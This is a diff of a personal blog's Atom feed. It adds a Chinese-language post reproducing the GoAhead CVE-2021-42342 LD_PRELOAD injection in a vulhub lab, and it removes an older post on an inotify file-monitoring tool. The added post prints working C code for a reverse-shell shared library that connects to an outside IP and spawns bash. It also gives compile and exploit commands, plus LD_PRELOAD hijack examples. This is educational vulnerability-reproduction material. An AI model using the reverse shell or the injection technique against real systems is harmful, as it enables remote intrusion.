@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://misakikata.github.io/"/>
-  <updated>2022-03-22T08:27:56.463Z</updated>
+  <updated>2022-07-01T10:31:39.251Z</updated>
   <id>https://misakikata.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>LD_PRELOAD变量注入</title>
+    <link href="https://misakikata.github.io/2022/07/LD-PRELOAD%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/"/>
+    <id>https://misakikata.github.io/2022/07/LD-PRELOAD变量注入/</id>
+    <published>2022-07-01T10:31:39.000Z</published>
+    <updated>2022-07-01T10:31:39.251Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="环境变量注入"><a href="#环境变量注入" class="headerlink" title="环境变量注入"></a>环境变量注入</h3><p>前两天看到一个ACTF的WP，由于没有参加，所以不太清楚题目，但是其中有一个gogogo的题目，利用的是环境变量的注入方式，而且还是LD_PRELOAD劫持。这个漏洞是GoAhead的一个CVE-2021-42342。</p><h3 id="CVE-2021-42342"><a href="#CVE-2021-42342" class="headerlink" title="CVE-2021-42342"></a>CVE-2021-42342</h3><p>先复现一下这个漏洞，直接利用vulhub的靶场，<code>/vulhub/goahead/CVE-2021-42342</code>。</p><p>访问<code>http://127.0.0.1:8080/cgi-bin/index</code>，在这个地方上传一个恶意的so文件。</p><pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;sys&#x2F;socket.h&gt;#include&lt;netinet&#x2F;in.h&gt;char *server_ip&#x3D;&quot;192.168.36.138&quot;;uint32_t server_port&#x3D;1234;static void reverse_shell(void) __attribute__((constructor));static void reverse_shell(void)&#123;    int sock &#x3D; socket(AF_INET, SOCK_STREAM, 0);    struct sockaddr_in attacker_addr &#x3D; &#123;0&#125;;    attacker_addr.sin_family &#x3D; AF_INET;    attacker_addr.sin_port &#x3D; htons(server_port);    attacker_addr.sin_addr.s_addr &#x3D; inet_addr(server_ip);    if(connect(sock, (struct sockaddr *)&amp;attacker_addr,sizeof(attacker_addr))!&#x3D;0)        exit(0);    dup2(sock, 0);    dup2(sock, 1);    dup2(sock, 2);    execve(&quot;&#x2F;bin&#x2F;bash&quot;, 0, 0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译如上的文件</p><pre class="line-numbers language-none"><code class="language-none">gcc -s -shared -fPIC .&#x2F;hack.c -o hack.so  #由于对so有大小限制，这里才带-s参数。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成一个so文件后，可以直接利用给出的poc.py发送。或者也可以利用BURP构造包来发送。</p><pre class="line-numbers language-none"><code class="language-none">python poc.py http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;cgi-bin&#x2F;index hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果需要使用burp来构造包则需要注意一点就是保持文件描述符不被关闭，关闭选项上repeater的第一个update选项，同时修改包中的Content-Length长度，由于我的so是14384字节，这里改成15000.最后再用多余的字节填充到比15000多一些即可。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202207011831808.png" alt="image-20220701155215245"></p><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>通过上面这个漏洞的利用，可以看到使用了LD_PRELOAD这个环境变量，这个东西影响程序的运行时的链接（Runtime linker），它允许在程序运行前定义优先加载的动态链接库。</p><p>LD_PRELOAD环境变量相信都在PHP绕过<strong>disable_function</strong>函数的时候见过，就是利用劫持进行覆写相关的函数来执行恶意的so。</p><p>如果需要实现这种注入攻击的方式，则至少需要满足：</p><ol><li>能够上传自己的.so文件</li><li>能够控制环境变量的值（设置LD_PRELOAD变量），比如<strong>putenv</strong>函数</li></ol><p>如果还需要绕过disable_function，还需要一个外部功能的函数可以执行，常见的比如PHP的mail函数。</p><p>这里用一个编写的demo，比如我们想劫持/usr/bin/grep命令，可以先查看ls的动态链接库文件，<code>readelf -Ws</code>来查看。</p><p><img src="file://E:\Typora%20File\typroa%E5%9B%BE%E5%83%8F%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5\image-20220701163415305.png?lastModify=1656671436" alt="image-20220701163415305"></p><p>这里我们选用<code>strcpy@GLIBC_2.2.5 (3)</code>这个链接库。</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;​void payload() &#123;    system(&quot;id&quot;);&#125;​char *strcpy(char *dest, const char *src) &#123;   &#x2F;&#x2F;需要搜索查看函数的原型    if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123;        return 0;    &#125;    unsetenv(&quot;LD_PRELOAD&quot;);    payload();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者，这个<code>__attribute__((constructor))</code>的意思是先于main()函数调用 ，这种情况下大部分函数都可以劫持到。</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;unistd.h&gt;​static void before(void) __attribute__((constructor));​static void before(void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;id&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译</p><pre class="line-numbers language-none"><code class="language-none">gcc -s hack.c -fPIC -shared -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把这个so加入到环境变量中</p><pre class="line-numbers language-none"><code class="language-none">export LD_PRELOAD&#x3D;$PWD&#x2F;hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202207011830676.png" alt="image-20220701163438797"></p><p><strong>禁用</strong></p><p>使用gcc的-static参数可以把libc.so.6静态链入执行程序中。但这也就意味着你的程序不再支持动态链接。</p><p>参考文章：</p><p><a href="https://tttang.com/archive/1399/">https://tttang.com/archive/1399/</a></p><p><a href="https://mp.weixin.qq.com/s/Y_02LhQsGa8jhoA7qmSWLw">https://mp.weixin.qq.com/s/Y_02LhQsGa8jhoA7qmSWLw</a></p><p><a href="https://forum.butian.net/share/1493">https://forum.butian.net/share/1493</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;环境变量注入&quot;&gt;&lt;a href=&quot;#环境变量注入&quot; class=&quot;headerlink&quot; title=&quot;环境变量注入&quot;&gt;&lt;/a&gt;环境变量注入&lt;/h3&gt;&lt;p&gt;前两天看到一个ACTF的WP，由于没有参加，所以不太清楚题目，但是其中有一个gogogo的题目，利用的是环境
+      
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>云容器安全</title>
@@ -461,29 +484,6 @@
     
     
       <category term="Open Source Security" scheme="https://misakikata.github.io/tags/Open-Source-Security/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>基于inotify的Linux文件实时监控扫描</title>
-    <link href="https://misakikata.github.io/2020/09/%E5%9F%BA%E4%BA%8Einotify%E7%9A%84Linux%E6%96%87%E4%BB%B6%E5%AE%9E%E6%97%B6%E7%9B%91%E6%8E%A7%E6%89%AB%E6%8F%8F/"/>
-    <id>https://misakikata.github.io/2020/09/基于inotify的Linux文件实时监控扫描/</id>
-    <published>2020-09-04T09:02:23.000Z</published>
-    <updated>2020-09-04T09:02:38.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="watchfile"><a href="#watchfile" class="headerlink" title="watchfile"></a>watchfile</h2><p>项目地址：<a href="https://github.com/MisakiKata/watchfile">https://github.com/MisakiKata/watchfile</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre class="line-numbers language-none"><code class="language-none">#第三方库pip install pyinotify#使用supervisor来守护进程apt-get install supervisoryum install supervisor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><pre class="line-numbers language-none"><code class="language-none">#安装完成后需要启动，按需要修改配置文件supervisord -c &#x2F;etc&#x2F;supervisor&#x2F;supervisord.conf#配置文件例子; supervisor config file[unix_http_server]file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock   ; (the path to the socket file)chmod&#x3D;0700                       ; sockef file mode (default 0700)[supervisord]logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;supervisord.log ; (main log file;default $CWD&#x2F;supervisord.log)pidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ; (supervisord pidfile;default supervisord.pid)childlogdir&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor            ; (&#39;AUTO&#39; child log dir, default $TEMP); the below section must remain in the config file for RPC; (supervisorctl&#x2F;web interface) to work, additional interfaces may be; added by defining them in separate rpcinterface: sections[rpcinterface:supervisor]supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface[supervisorctl]serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; use a unix:&#x2F;&#x2F; URL  for a unix socket; The [include] section can just contain the &quot;files&quot; setting.  This; setting can list multiple files (separated by whitespace or; newlines).  It can also contain wildcards.  The filenames are; interpreted as relative to this file.  Included files *cannot*; include files themselves.[include]files &#x3D; &#x2F;data&#x2F;vscode&#x2F;watchfile&#x2F;watchfile.conf    #修改自己的配置文件地址由于调用了河马扫描程序来检测文件，所以大量文件同时变更时，检测会慢，建议系统做大量变更时可以停掉程序。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><pre class="line-numbers language-none"><code class="language-none">在config.ini 中修改自己的配置，因为使用多线程来监控多目录，建议使用多目录配置运行 python3 daemon.py来查看输出和测试邮件异常处理查看输出日志的时候，如果出现wd&#x3D;-1   需要修改 vim &#x2F;etc&#x2F;sysctl.conffs.inotify.max_user_watches &#x3D; 128000    #决定了同时同一用户可以监控的目录数量日志中看到Event Queue Overflowmax_queued_events太小需要调整参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;watchfile&quot;&gt;&lt;a href=&quot;#watchfile&quot; class=&quot;headerlink&quot; title=&quot;watchfile&quot;&gt;&lt;/a&gt;watchfile&lt;/h2&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/MisakiKat
-      
-    
-    </summary>
-    
-    
-      <category term="shell" scheme="https://misakikata.github.io/tags/shell/"/>
     
   </entry>
   
